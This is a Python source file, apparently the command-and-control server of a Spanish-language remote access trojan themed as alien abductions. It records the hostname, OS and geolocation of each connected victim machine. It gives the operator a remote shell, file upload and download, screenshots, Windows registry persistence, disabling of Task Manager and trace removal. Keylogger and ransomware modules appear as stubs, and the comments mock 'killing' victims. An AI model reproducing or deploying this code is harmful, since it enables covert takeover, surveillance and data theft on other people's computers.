
# NUCLEO DE TODO INVASORES >:)
# CREADO POR KIRARI


# MODULOS DEL SISTEMA
import re
import os
import sys
import time
import socket
import pygame	
#import configparser

from tabulate import tabulate
from threading import Thread

from Crypto import Random
from Crypto.Cipher import AES

# MODULOS CREADOS
import utilidades.creador_ayuda as ayuda
from utilidades.banners import *
from utilidades.cadenas import chain_alien

from config import IP,PORT

# ----------------------------------------------------------------------------------------


# MODO LIVE PARA ABDUCCION 
EnVivo=False


# CARGAR MUSICAS
def cargar_banda_sonora(musica):
	pygame.mixer.music.load(os.getcwd() + musica)
	pygame.mixer.music.play(loops=-1)
	return


def cartelAyuda():
	print("""\033[0;39m

 \033[1;31m[-] Puedes tipear 'ayuda' para ver los comandos disponibles \033[0;39m

	""")
	return

# BANNERS PARA CADA MENU
def encabezados(banner):
	os.system('clear')
	if banner=="principal":
		banner_principal()
	elif banner=="secundario":
		banner_secundario()
	elif banner=="abduccion":
		banner_abduction_menu()
	elif banner=="laboratorio":
		banner_laboratorio()
	elif banner=="manipular":
		banner_manipular()
	cartelAyuda()
	return

# DESPLIEGA AYUDA ESPECIFICA EN CADA SECCION DEL PROGRAMA
def desplegar_ayuda(COMANDOS,tipo):
	if tipo=="principal":
		ayuda.comandos(COMANDOS,"Comandos generales")
		ayuda.comandos_basicos('secundario')
	
	elif tipo=="abducciones":
		ayuda.comandos(COMANDOS,"Comandos abducciones")
		ayuda.comandos_basicos('secundario')

	elif tipo=="laboratorio":
		ayuda.comandos(COMANDOS,'Comandos laboratorio')
		ayuda.comandos_basicos('secundario')

	elif tipo=="manipular":
		ayuda.comandos_basicos('secundario')

	elif tipo=="cmd":
		ayuda.comandos(COMANDOS,'Comandos shell')

	return


# FRASES AL MATAR UNA MAQUINA VICTIMA 
def ataques():

	import random

	frases = [

	"Aniquilaste a victima con rayo desintegrador",
	"Perforando el ano del objetivo. La cabeza de la victima ha sido explotada",
	"Aturdiendo al individuo con rayos de electricidad",
	"Has disparado una poderosa bomba de iones sobre el terricola",
	"Has extraido el cerebro del individuo, quitandole la vida de manera rapida",
	"Lanzando gusano alienigena para devorar objetivo"
	
	]

	return random.choice(frases)


# VER AHORA
def control_ruta(path):

	if os.path.exists(path):

		if os.path.isdir(path):
			return False

		elif os.path.isfile(path):
			return True

		else:
			return False

	else:
		return False
		
	# ruta = path.split(signo)

	# print(ruta)

	# if (ruta.pop()!=""):
	# 	verificar_ruta = signo.join(ruta)

	# 	if (os.path.isdir(verificar_ruta)):
	# 		return True
	# 	else:
	# 		return False
	# else:
	# 	return False


# ------------------------------------------------------------------------------------------


class Server(Thread):


	# --------- CONFIGURACION DEL SERVIDOR ---------

	def __init__(self,ip,port):
		super(Server, self).__init__()

		self.terricolas = []
		self.ip = ip
		self.port = int(port)

		try:

			self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

			self.server.bind((self.ip,self.port))
			self.server.listen(5)

		except socket.error as e:
			print (" Error: ", e)
			input (" Presione una tecla para continuar...")
			sys.exit(0)


	#def cifrar(self,msg,BLOCK_SIZE=32):
	#	iv = Random.new().read(BLOCK_SIZE)
	#	obj = AES.new('This is a key123', AES.MODE_CBC, iv)
	#    ciphertext = obj.encrypt(message)
	#    return ciphertext


	# PARA CADA FUNCION QUE EJERCERA EL SERVIDOR SE LE DEBERA PASAR COMO PARAMETRO
	# LA CONEXION DE LA MAQUINA OBJETIVO A LA QUE SE DESEA ENVIAR INFORMACION


	# --------- ENVIAR MENSAJES ---------

	def enviar(self,server,mensaje):
		server.send(bytes(mensaje,'utf-8'))
		return


	# --------- RECIBIR MENSAJES ---------

	def recibir(self,server,chunk=4096):
		raw_msg = server.recv(chunk)
		#self.server.settimeout(3)
		msg = (raw_msg).decode('utf-8')
		return msg


	def recibir_todo(self,server):

		completo = ""

		while(True):
			contenido = self.recibir(server,1024)
			if (contenido=='ok'):
				break
			#self.server.settimeout(3)
			completo+=contenido

		print ("\n"+completo+"\n")
	
		return True


	# --------- OBTENER INFORMACION --------- 

	## Para obtener la informacion, se le pasa como parametro la conexion 
	## y la lista con direccion IP con puerto cliente.

	def obtener_informacion(self,client,address):
		hostname = self.recibir(client)
		self.enviar(client,"ready")
		sistema = self.recibir(client)
		self.enviar(client,"ready")
		ip_info = (self.recibir(client)).split(',')
		ciudad = ip_info[0]
		ip_public = ip_info[1]
		pais = ip_info[2]
		estado = ip_info[3]
		geolocation = {'city_name':ciudad, 'IPv4':ip_public, 'country_name':pais, 'state':estado}
		return [client,address,hostname,sistema,geolocation]



	# --------- ESCRIBIR INFORMACION --------- 

	## Escribe la informacion del cliente que se capturo en el proceso de escucha
	## y lo almacena en un archivo, para luego ser utilizado en el modo "Abduccion en Vivo".
    ## Informacion -> hostname, ciudad, estado y pais

	def EscribirInformacion(self,info):
		inf = "['"+info[2]+"',"+str(info[4])+","+str(info[1][1])+"]\n"
		with open('core/abducciones/capturados.txt','a+') as archivo:
			archivo.write(inf)
		return


	# --------- ABDUCIR VICTIMAS ---------

	## Al comenzar el servidor, se creara un hilo que pondra al servidor en escucha
	## para que los clientes se conecten al mismo.

	def run(self):

		while (True):
			try:
				conexion, address = self.server.accept()
				conexion.setblocking(1)
				client_info = self.obtener_informacion(conexion,address)
				self.terricolas.append(client_info)
				self.EscribirInformacion(client_info)
			except Exception as e:
				print(' Error al abducir a un terricola: ',e)
				continue

		return


	# --------- VER EN VIVO ---------

	## Permite ver como los clientes se conectan al servidor. Para esto, recurre al
	## archivo donde se escribio toda la informacion de cada cliente.

	def VerAbducciones(self):
		# -hold en xterm es para que la ventana quede estatica y no se cierre al terminar el programa
		os.system('xterm -fg white -bg black -geometry 93x31+0+100 -title "Abduccion en vivo" -e python3 core/abducciones/live.py &')
		return



	# --------- LISTAR VICTIMAS ---------

	## Genera un listado de todas las maquinas cliente conectadas al servidor.
	## Como parametro se le pasa el modo en el cual se quiere ver el listado.

	def ver_terricolas(self,modo):

		lista_terricolas_table = []

		if (modo=="abduccion"):
			encabezados = ["ID", "Terricola", "Pais", "Ciudad" ]

			for terricola in self.terricolas:
				lista_terricolas_table.append([terricola[2],terricola[4]["country_name"],terricola[4]["city_name"]])

		elif (modo=="laboratorio"):
			encabezados = ["ID", "Terricola", "Pais", "Ciudad", "Sistema Operativo" ,"Direccion IP (Privada)", "IPv4 (Publica)", "Puerto"]

			for terricola in self.terricolas:
				lista_terricolas_table.append([terricola[2],terricola[4]["country_name"],terricola[4]["city_name"],terricola[3],terricola[1][0],terricola[4]["IPv4"],terricola[1][1]])


		if(len(self.terricolas)>0):
			print ("\n \033[1;34mLista de personas secuestradas\033[0;39m\n")
			index = [i for i in range(1,len(self.terricolas)+1)]
			print (tabulate(lista_terricolas_table, tablefmt="fancy_grid", headers=encabezados, showindex=index),"\n\n")

		else:
		 	print("\n [\033[1;31mx\033[0;39m] No hay personas capturadas\n")

		return 



	# --------- REMOVER REGISTRO DE VICTIMA -------------

	## Elimina la conexion del cliente seleccionado de la lista de conexiones.
	## Se le pasa como parametro la conexion cliente.

	def remover_terricola(self,client):
		return self.terricolas.pop(client)	



	# --------- MATAR A UN SECUESTRADO ESPECIFICO -------------

	## Permite matar la conexion del cliente con el servidor.
	## Se le pasa como parametro la conexion cliente.
	
	def matar_terricola(self,client):

		self.enviar(self.terricolas[client][0],"matar")
		self.remover_terricola(client)
		return




	# --------- MATAR A TODAS LAS VICTIMAS CAPTURADAS ---------

	## Permite matar a todas las conexiones cliente con el servidor a partir
	## de la lista de conexiones. Al terminar el proceso anterior, se limpiara
	## la lista. Mientras este proceso esta en marcha, emite una frase divertida.

	def matar_terricolas(self):

		contador = 0

		if(len(self.terricolas)>0):
			print(" \n [\033[1;34m*\033[0;39m] Preparandote para acabar con los individuos...\n")
			time.sleep(2)

			for terricola in self.terricolas:

				try:
					print(" [\033[1;34m*\033[0;39m] Matando a terricola " + terricola[2])
					self.enviar(terricola[0],'matar')
					print(" [\033[1;34m*\033[0;39m] " + ataques())
					
				except ConnectionResetError as e:
					print (" [\033[1;31mx\033[0;39m] Durante la sesion, la victima ha muerto: ",e);
					time.sleep(0.5)
					print (" [\033[1;32m+\033[0;39m] Se ha desechado el cuerpo de " + terricola[2])
					self.remover_terricola(contador)

				except BrokenPipeError as e:
					print (" [\033[1;31mx\033[0;39m] Durante la sesion, la victima ha muerto: ",e);
					self.remover_terricola(contador)
				
				contador += 1
				time.sleep(0.5)

			self.terricolas.clear()
			print("\n [!] Ha eliminado a todos los secuestrados!\n\n")
		
		else:
			print(" \n [\033[1;31mx\033[0;39m] No hay terricolas\n")

		return


	# --------- DETENER SERVIDOR ---------

	## Mata todas las conexiones cliente con el servidor y luego vacia la lista.
	## Es igual al metodo "matar_terricolas" pero esta es exclusiva para cuando
	## se detenga el servidor y no emita ningun tipo de mensaje. Luego de este
	## proceso, cierra el socket.

	def destruir_evidencias(self):
		
		contador = 0

		for terricola in self.terricolas:

			try:
				self.enviar(terricola[0],"matar")
			except ConnectionResetError:
				self.remover_terricola(contador)

			except BrokenPipeError as e:
				self.remover_terricola(contador)
			
			contador += 1
			time.sleep(0.5)
		
		self.terricolas.clear()
		return


	def detener(self):
		self.destruir_evidencias()
		self.server.close()
		return



# -----------------------------------------------------------------------------------------


## Una clase con diferentes metodos para manipular al cliente.

class Control():

	## A esta clase se le pasa como parametros, el servidor que se creo y la 
	## posicion en la cual se encuentra el cliente a querer controlar

	def __init__(self,servidor,client):
		self.servidor = servidor
		# SELF.OBJETIVO ES LA CONEXION CLIENTE SELECCIONADA 
		self.objetivo = servidor.terricolas[client][0]
		self.hostname = servidor.terricolas[client][2]


	# --------- MODULOS DE CONTROL ---------

	## [SHELL]
	### Devuelve una shell

	def run_cmd(self):
		
		COMANDOS = {

		"{detener|exit}" : ["stop","Detiene temporalmente a la victima"]

		}

		self.servidor.enviar(self.objetivo,"cmd")

		sesion = input(" (\033[0;31m" + self.hostname + "\033[0;39m)> ")

		while(True):

			if(sesion!=""):
				if("cd " in sesion):
					self.servidor.enviar(self.objetivo,sesion)
					location = self.servidor.recibir(self.objetivo)
					print(location)

				elif (sesion=="detener") or (sesion=="exit"):
					self.servidor.enviar(self.objetivo,sesion)
					t = self.servidor.recibir(self.objetivo)
					print(t)
					break

				elif (sesion=="ayuda"):
					desplegar_ayuda(COMANDOS,'cmd')

				else:
					self.servidor.enviar(self.objetivo,sesion)
					self.servidor.recibir_todo(self.objetivo)


			sesion = input(" (\033[0;31m" + self.hostname + "\033[0;39m)> ")

		return


	## [DESHABILITAR EL ADMINISTRADOR DE TAREAS] -> Solo funciona en Windows
	### La víctima tratará de librarse de tí, pero no será muy fácil. Podrás 
	### deshabilitar el administrador de tareas para evitar que el cierre tu actividad en su interior.

	def deshabilitar_TaskManager(self):

		self.servidor.enviar(self.objetivo,"taskManagerDisable")
		self.servidor.recibir(self.objetivo)
		time.sleep(0.01)

		# Envia a cliente que se deshabilite el Tmgr
		self.servidor.enviar(self.objetivo,"task_disable")
		msg = self.servidor.recibir(self.objetivo)
		print(msg)
		return


	## [CREAR CONEXION CON NETCAT]	

	def netcat(self):
		#servidor.enviar(servidor.terricolas[client][0],"netcat")
		#os.system('xterm -fg white -bg black -geometry 93x31+0+100 -title "Victima Netcat" -e nc -lp 9001 &')
		return (" Modulo en desarrollo")


	## [ACTIVAR PERSISTENCIA] -> Solo funciona en Windows	
	### Podras copiarte en los registros del sistema para obtener persistencia.

	def persistencia(self):

		# Envia modo persistencia
		print (" [\033[1;34m*\033[0;39m] Enviando ordenes al gusano... ")
		time.sleep(1)
		self.servidor.enviar(self.objetivo,"persistencia")
		time.sleep(1.5)
		print (" [\033[1;34m*\033[0;39m] Intentando obtener persistencia... ")
		msg = self.servidor.recibir(self.objetivo)
		time.sleep(2)
		print (msg)
		return


	## [REMOVER PERSISTENCIA] -> Solo funciona en Windows	
	### Una vez que hayas acabado con la víctima, puedes 
	### eliminar todo tipo de rastro del bicho implantado en el sistema.

	def autoremoverse(self):

		print (" [\033[1;34m*\033[0;39m] Enviando ordenes al gusano... ")
		time.sleep(1)
		self.servidor.enviar(self.objetivo,"autoremover")
		time.sleep(1.5)
		print (" [\033[1;34m*\033[0;39m] Intentando autoremoverse del cerebro victima... ")
		msg = self.servidor.recibir(self.objetivo)
		time.sleep(2)
		print (msg)
		return


	## [KEYLOGGER]	
	### Graba cualquier movimiento que la víctima haga mediante pulsaciones en el teclado. 
	### Toda la información se registrará en un archivo.

	# def keylogger(self):
		
	# 	self.servidor.enviar(self.objetivo,"keylogger")

	# 	from pynput.keyboard import Key

	# 	archivo = open("key_log.txt","a")

	# 	print (" [\033[1;34m*\033[0;39m] Keylogger en escucha...")

	# 	try:
	# 		while (True):
	# 			key = self.servidor.recibir(self.objetivo)
	# 			self.servidor.enviar(self.objetivo,"ok")
	# 			archivo.write(key)
	# 			print (key)
	# 	except KeyboardInterrupt:
	# 		self.servidor.enviar(self.objetivo,"detener")
	# 		self.servidor.recibir(self.objetivo)
	# 		time.sleep(0.01)
	# 		archivo.close()
	# 		print (" [\033[1;32m+\033[0;39m] Registro de teclas guardado en: key_log.txt")
	# 		return

	# 	return


	## [SCREENSHOT]	
	### Si quieres pruebas de que la víctima no te engaña, 
	### toma capturas de pantalla para corroborar sus acciones.

	def screenshot(self):

		# Envia y recibe mensaje del modo a utilizar
		self.servidor.enviar(self.objetivo,"screenshot")
		self.servidor.recibir(self.objetivo)

		if not os.path.isdir("screenshots"):
			os.mkdir("screenshots")

		self.servidor.enviar(self.objetivo,"nombre")
		nombre_archivo = self.servidor.recibir(self.objetivo)


		if (nombre_archivo!="failed"):

			self.servidor.enviar(self.objetivo,'size')
			size = int(self.servidor.recibir(self.objetivo))

			with open("screenshots/"+nombre_archivo,"wb") as archivo:
				while (size>0):
					contenido = self.objetivo.recv(1024)
					archivo.write(contenido)
					size-=len(contenido)


			print (" [\033[1;32m+\033[0;39m] La captura se guardo en: screenshots/"+nombre_archivo)

		else:
			print (" [\033[1;31mx\033[0;39m] No se pudo capturar la imagen debido a la incompatibilidad.")


		return


	## [GRABAR AUDIO]	
	### Si quieres mantenerte informado de lo que sucede alrededor 
	### del capturado, entonces activa este módulo, para escuchar 
	### todos sus movimientos.

	def grabarAudio(self):
		return


	## [RANSOMWARE]
	### Si la víctima se resiste a darte lo que quieres, sólo toma 
	### de rehénes a sus personas más cercanas. Entonces podrás pedir 
	### lo que quieras a cambio de liberarlas. (Se recomienda usar 
	### este módulo en un entorno controlado).

	def ransomware(self):
		return



	## [SUBIR Y DESCARGAR ARCHIVOS]
	### Claramente como lo dice el subtitulo, podrás subir cualquier archivo 
	### de tú máquina al del equipo víctima. Igualmente vas a poder descargar
	### cualquier archivo del secuestrado.

	def subir_archivos(self,subida):

		#cambio = (cambio.replace('subir ','')).split()
		
		if ("subir" in subida):
			
			if (subida=="subir"):
				print (' Utilice -> subir "<Ruta origen>" "<Ruta destino>"')
				return False

			elif ("subir " not in subida):
				print('\n [\033[1;31mx\033[0;39m] Comando "'+subida+'" no encontrado.\n')
				return False

			else:

				try:

					subida = (subida.replace('subir','')).split('"')

					del subida[0]
					del subida[1]
					del subida[2]

				except:
					print (" [\033[1;31mx\033[0;39m] Mala sintaxis. Utilice -> subir \"<Ruta origen>\" \"<Ruta destino>\"")
					return False

		else:
			return False

		#print(subida)	

		if (len(subida)==2) and (control_ruta(subida[0])!=False):
			origen = subida[0]
			if (subida[1]!=""):
				destino = subida[1]
			else:
				print (" [\033[1;31mx\033[0;39m] Debe colocar una ruta destino.")
				return False
		else:
			print (" [\033[1;31mx\033[0;39m] El archivo que quieres subir no existe.")
			return False

		#print(origen, " --- ", destino)

		# Envia modo de uso y recibe el 'ok'
		self.servidor.enviar(self.objetivo,"subir")
		self.servidor.recibir(self.objetivo)

		# Envia el destino donde se va a guardar el archivo
		self.servidor.enviar(self.objetivo,destino)
		respuesta = self.servidor.recibir(self.objetivo)
		time.sleep(0.1)

		if (respuesta=="ok"):

			self.servidor.enviar(self.objetivo,str(os.path.getsize(origen)))
			self.servidor.recibir(self.objetivo)
			time.sleep(1)

			# Se prepara para el envio de datos del archivo
			with open(origen, "rb") as archivo_origen:
					contenido = archivo_origen.read(1024)
					while contenido:
						self.objetivo.sendall(contenido)
						contenido = archivo_origen.read(1024)

			print(" [\033[1;32m+\033[0;39m] El archivo se subio correctamente.")    

		elif (respuesta=="directorio"):
			print (" [\033[1;31mx\033[0;39m] Ruta destino es un directorio.")

		else:
			print (" [\033[1;31mx\033[0;39m] Ruta destino no existe o no se especifico nombre de nuevo archivo.")

		return



	def descargar_archivos(self,bajada):

		if ("descargar" in bajada):
			
			if (bajada=="descargar"):
				print (" Utilice -> descargar \"<Ruta origen>\" \"<Ruta destino>\"")
				return

			elif ("descargar " not in bajada):
				print('\n [\033[1;31mx\033[0;39m] Comando "'+bajada+'" no encontrado.\n')
				return

			else:
				
				try:

					bajada = (bajada.replace('descargar','')).split('"')

					del bajada[0]
					del bajada[1]
					del bajada[2]

				except:
					print (" [\033[1;31mx\033[0;39m] Mala sintaxis. Utilice -> descargar \"<Ruta origen>\" \"<Ruta destino>\"")
					return False

		else:
			return False


		if (len(bajada)==2):
			
			destino = bajada[1]
				
			if (bajada[0]!=""):
				origen = bajada[0]
			
			else:
				print (" [\033[1;31mx\033[0;39m] Debe colocar una ruta destino.")
				return False


		# Envia modo de uso y recibe el 'ok'
		self.servidor.enviar(self.objetivo,"descargar")
		self.servidor.recibir(self.objetivo)


		# Envia ruta a descargar
		self.servidor.enviar(self.objetivo,bajada[0])
		time.sleep(0.1)

		size = int(self.servidor.recibir(self.objetivo))

		if (size!=-1):
			
			self.servidor.enviar(self.objetivo,"ok")

			#print(size)

			# Abre el archivo nuevo 
			with open(destino, "wb") as archivo_destino:
				#contenido = self.client.recv(1024)
				#print(os.path.getsize(destino))
				while (size>0):
					contenido = self.objetivo.recv(1024)
					archivo_destino.write(contenido)
					size-=len(contenido)
					#print(size)

			print(" [\033[1;32m+\033[0;39m] El archivo se descargo correctamente.")   

		else:
			print (" [\033[1;31mx\033[0;39m] Ruta origen no existe o es un directorio... O no se especifico archivo.")
			
		return


	# MODULOS PARA COMANDOS EXCEPCIONALES DEL SISTEMA VICTIMA

	def ls(self):
		self.servidor.enviar(self.objetivo,"ls")
		self.servidor.recibir_todo(self.objetivo)

	def pwd(self):
		self.servidor.enviar(self.objetivo,"pwd")
		self.servidor.recibir_todo(self.objetivo)
		return

	def cd(self,ruta):
		if ("cd" in ruta):
			
			if (ruta=="cd"):
				print (" Utilice 'cd <ruta>'")
				return

			elif ("cd " not in ruta):
				print('\n [\033[1;31mx\033[0;39m] Comando "'+ruta+'" no encontrado.\n')
				return

		else:
			return False

		self.servidor.enviar(self.objetivo,ruta)
		location = self.servidor.recibir(self.objetivo)
		print(location)
		return



	# MODULOS PARA COMANDOS RED

	def ifconfig(self):
		print ("\n Configuraciones de red de la victima")
		print (" ====================================")
		self.servidor.enviar(self.objetivo,"ifconfig")
		self.servidor.recibir_todo(self.objetivo)
		return



# --------------------- MENUS --------------------------------------------

def manipular(servidor,cliente):

	# "keylogger" : ["keylogger","Grabar pulsaciones de teclas de victima"]

	COMANDOS_EXTRA = {

	"cmd" : ["shell","Ejecutar shell"],
	"netcat" : ["netcat","Utiliza netcat para obtener un shell inversa"],
	"persistencia" : ["persistence","Implantar bicho en el cerebro victima"],
	"autoremover" : ["autoremove","Elimina rastro del bicho en el sisetma infectado"],
	"screenshot" : ["screenshot","Saca una captura de pantalla del equipo victima"],
	"taskmgr_disable" : ["taskmgr_disable","Deshabilita el administrador de tareas de Windows"]

	}

	COMANDOS_SISTEMA = {

	"ls" : ["ls","Listar directorios de la carpeta actual"],
	"pwd" : ["pwd","Ver posicion actual"],
	"cd <directorio>" : ["cd","Cambiar de directorio"]

	}


	COMANDOS_RED = {

	"ifconfig" : ["upload","Ver configuraciones de red de la victima"]

	}


	COMANDOS_ARCHIVOS = {

	"subir" : ["upload","Subir archivo a equipo remoto"],
	"descargar" : ["download","Descargar archivo de equipo remoto"]

	}



	encabezados('manipular')

	control = Control(servidor,cliente)
	
	victima = (input(" \033[0;39mInvasores (\033[0;33mLaboratorio/" + servidor.terricolas[cliente][2] + "\033[0;39m) --> \033[0;39m")).strip()

	while (victima!="volver"):

		# MODULOS EXTRA

		if (victima=="cmd"):
			control.run_cmd()
			encabezados('manipular')
		
		elif (victima=="netcat"):
			os.system('clear')
			banner_manipular()
			control.netcat()
			encabezados('manipular')

		# elif (victima=="keylogger"):
		# 	control.keylogger()

		elif (victima=="persistencia"):
			control.persistencia()

		elif (victima=="autoremover"):
			control.autoremoverse()

		elif (victima=="screenshot"):
			control.screenshot()

		elif (victima=="taskmgr_disable"):
			control.deshabilitar_TaskManager()

		# MODULOS ARCHIVOS

		elif ("subir" in victima):
			control.subir_archivos(victima)
 
		elif ("descargar" in victima):
			control.descargar_archivos(victima)

		# MODULOS DE RED

		elif (victima=="ifconfig"):
			control.ifconfig()


		# MODULOS DE COMANDOS DE SISTEMA

		elif (victima=="pwd"):
			control.pwd()

		elif (victima=="ls"):
			control.ls()

		elif ("cd" in victima):
			control.cd(victima)

		# MODULOS BASICOS

		elif (victima=="ayuda"):
			ayuda.comandos(COMANDOS_EXTRA,"Comandos core")
			ayuda.comandos(COMANDOS_ARCHIVOS,"Comandos de archivos")
			ayuda.comandos(COMANDOS_RED,"Comandos de red")
			ayuda.comandos(COMANDOS_SISTEMA,"Comandos del sistema")
			ayuda.comandos_basicos("secundario")


		elif (victima=="limpiar"):
			encabezados('manipular')

		elif (victima==""):
			pass

		else:
			print('\n [\033[1;31mx\033[0;39m] Comando "'+victima+'" no encontrado.\n')

		victima = (input(" \033[0;39mInvasores (\033[0;33mLaboratorio/" + servidor.terricolas[cliente][2] + "\033[0;39m) --> \033[0;39m")).strip()

	return


def laboratorio(servidor):

	COMANDOS = {

	"manipular <id>" : ["Manipulation","Controlar a un individuo especifico"],
	"matar <id>" : ["Kill","Sirve para asesinar al terricola"],
	"listar": ["List","Lista a las personas comprometidas de manera interactiva"],

	}


	encabezados("laboratorio")

	print ("\n [\033[1;32m+\033[0;39m] Hay " + str(len(servidor.terricolas)) + " terricolas para su control\n")

	prompt_laboratorio = (input(" \033[0;39mInvasores (\033[0;31mLaboratorio\033[0;39m) --> \033[0;39m").lower()).strip()

	while(prompt_laboratorio!="volver"):

		try:

			if ('manipular' in prompt_laboratorio):
				if (prompt_laboratorio=="manipular"):
					print(" Utilice 'manipular <id>'")
				elif ("manipular " not in prompt_laboratorio):
					print('\n [\033[1;31mx\033[0;39m] Comando "', prompt_laboratorio, '" no encontrado.\n')
				else:
					try:
						cliente = int(prompt_laboratorio.replace('manipular', ''))-1

						if (cliente < len(servidor.terricolas)) and (cliente>=0):
							chain_alien(" \n [\033[1;34m*\033[0;39m] Tomando control sobre el humano...")
							time.sleep(1.3)
							chain_alien ("\n [\033[1;32m+\033[0;39m] El cuerpo esta listo para su control.")
							time.sleep(1.5)
							manipular(servidor,cliente)
							encabezados("laboratorio")
							print ("\n [\033[1;32m+\033[0;39m] Hay " + str(len(servidor.terricolas)) + " terricolas para su control\n")
						else:
							print (" \n [\033[1;31mx\033[0;39m] No existe el terricola indicado...\n");

					except ValueError as e:
						#print(e)
						print (" \n [\033[1;31mx\033[0;39m] Error al manipular a victima. Utilice 'manipular <id>'\n");

			elif ('matar' in prompt_laboratorio):
				if (prompt_laboratorio=="matar"):
					print(" Utilice 'matar <id>'")
				elif ("matar " not in prompt_laboratorio):
					print('\n [\033[1;31mx\033[0;39m] Comando "', prompt_laboratorio, '" no encontrado.\n')
				else:
					try:
						cliente = int(prompt_laboratorio.replace('matar', ''))-1
						
						if (cliente < len(servidor.terricolas)) and (cliente>=0):
							servidor.matar_terricola(cliente)
							print("\n [\033[1;34m*\033[0;39m] " + ataques() + "\n")
						else:
							print (" \n [\033[1;31mx\033[0;39m] No existe el terricola indicado...\n");

					except ValueError:
						print (" \n [\033[1;31mx\033[0;39m] Error al matar a victima. Utilice 'matar <id>'\n");

			elif (prompt_laboratorio=="listar"):
				servidor.ver_terricolas("laboratorio")

			elif (prompt_laboratorio=="ayuda"):
				desplegar_ayuda(COMANDOS,'laboratorio')

			elif (prompt_laboratorio=="limpiar"):
				encabezados('laboratorio')

			elif (prompt_laboratorio==""):
				pass

			else:
				print('\n [\033[1;31mx\033[0;39m] Comando "'+ prompt_laboratorio+ '" no encontrado.\n')

		except ConnectionResetError as e:
			print (" [\033[1;31mx\033[0;39m] Durante la sesion, la victima ha muerto: ",e);
			time.sleep(0.5)
			print (" [\033[1;32m+\033[0;39m] Se ha desechado el cuerpo de " + servidor.terricolas[cliente][2])
			servidor.remover_terricola(cliente)

		except BrokenPipeError as e:
			print (" [\033[1;31mx\033[0;39m] Durante la sesion, la victima ha muerto: ",e);
			servidor.remover_terricola(cliente)

		prompt_laboratorio = (input(" \033[0;39mInvasores (\033[0;31mLaboratorio\033[0;39m) --> \033[0;39m").lower()).strip()

	return


def AbduccionEnVivo(servidor):
	global EnVivo

	if (EnVivo==False):
		EnVivo=True
		servidor.VerAbducciones()
	else:
		print(" Modo abduccion en vivo: activo")
		activar = (input(" El modo abduccion en vivo se encuentra activa. Desea apagarla? (s/n): ")).lower()
		while (activar!="s") and (activar!="n"):
			print(" Opcion inexistente... Intente nuevamente...")
			activar = (input(" El modo abduccion en vivo se encuentra activa. Desea apagarla? (s/n): ")).lower()
		if (activar=="s"):
			os.system('pkill -9 -f xterm')
			EnVivo=False
			print(" Modo abduccion en vivo: desactivado")
			time.sleep(2.5)
	return


def abducciones_menu(servidor):

	COMANDOS = {

	"live" : ["live","Permite ver el proceso de abduccion en modo real"],
	"abducidos" : ["Abducted","Lista todas las personas secuestradas"],

	}
	
	pygame.init()
	cargar_banda_sonora("/core/musica/abduction.mp3")

	encabezados("abduccion")

	selector = (input(" \033[0;39mInvasores (\033[0;31mAbducciones\033[0;39m) --> \033[0;39m").lower()).replace(" ","")

	while (selector!='volver'):

		if (selector=='live'):
			AbduccionEnVivo(servidor)
			encabezados("abduccion")

		elif (selector=='abducidos'):
			servidor.ver_terricolas("abduccion")

		elif (selector=='ayuda'):
			desplegar_ayuda(COMANDOS,"abducciones")

		elif (selector=='limpiar'):
			encabezados('abduccion')

		elif(selector==''):
			pass

		else:
			print('\n [\033[1;31mx\033[0;39m] Comando "'+ selector + '" no encontrado.\n')

		selector = (input(" \033[0;39mInvasores (\033[0;31mAbducciones\033[0;39m) --> \033[0;39m").lower()).replace(" ","")

	return


def menu():

	COMANDOS = {

	"abducir" : ["Abduct","Acceder al menu de abducciones"],
	"laboratorio" : ["Laboratory","Acceder al laboratorio"],
	"destruirlos" : ["Massive Destruction","Destruye a todos los individuos comprometidos"]

	}

	servidor = Server(IP,PORT)
	servidor.setDaemon(True)
	servidor.start()

	pygame.init()
	cargar_banda_sonora("/core/musica/laboratory.mp3")

	encabezados("secundario")

	opcion = (input(" \033[0;39mInvasores (\033[0;31mPrincipal\033[0;39m) --> \033[0;39m").lower()).replace(" ","")

	while(opcion!="volver"):

		if(opcion=="abducir"):
			abducciones_menu(servidor)
			cargar_banda_sonora("/core/musica/laboratory.mp3")
			encabezados("secundario")
		elif(opcion=="laboratorio"):
			laboratorio(servidor)
			encabezados("secundario")
		elif(opcion=="destruirlos"):
			servidor.matar_terricolas()
		elif(opcion=="ayuda"):
			desplegar_ayuda(COMANDOS,"principal")	
		elif(opcion=="limpiar"):
			encabezados("secundario")
		elif(opcion==''):
			pass
		else:
			print('\n [\033[1;31mx\033[0;39m] Comando "' + opcion + '" no encontrado.\n')


		opcion = (input(" \033[0;39mInvasores (\033[0;31mPrincipal\033[0;39m) --> \033[0;39m").lower()).replace(" ","")

	os.system('pkill -9 -f xterm')
	os.system('clear')
	servidor.detener()

	return


if __name__ == '__main__':
	menu()